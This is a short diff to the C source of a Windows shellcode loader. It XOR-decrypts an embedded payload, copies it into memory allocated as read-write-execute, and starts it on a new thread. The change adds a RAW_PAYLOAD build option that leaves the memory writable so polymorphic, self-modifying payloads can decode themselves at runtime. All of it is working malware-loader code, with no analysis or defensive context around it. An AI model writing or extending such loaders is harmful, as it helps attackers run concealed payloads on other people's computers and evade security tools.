@@ -246,13 +246,18 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE hPrev, LPSTR lpCmdLine, int nShow)
     /* 3. XOR decrypt in-place */
     xor_decrypt(sc, sc_len, xor_key, key_len);
 
-    /* 4. Allocate RWX in the current process, copy shellcode, then tighten to RX */
+    /* 4. Allocate RWX, copy shellcode.
+     * RAW_PAYLOAD: keep RWX — poly/self-modifying stubs decode in-place and
+     * need write access during execution.  Staged mode tightens to RX after
+     * the XOR pass because the payload is already plain shellcode at that point. */
     PVOID exec = VirtualAlloc(NULL, sc_len, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
     if (!exec) { VirtualFree(sc, 0, MEM_RELEASE); return 1; }
     memcpy(exec, sc, sc_len);
     VirtualFree(sc, 0, MEM_RELEASE);
+#ifndef RAW_PAYLOAD
     DWORD old_prot = 0;
     VirtualProtect(exec, sc_len, PAGE_EXECUTE_READ, &old_prot);
+#endif
 
     /* 5. Spawn the shellcode on a new thread; keep the loader alive while it runs */
     HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)exec, NULL, 0, NULL);
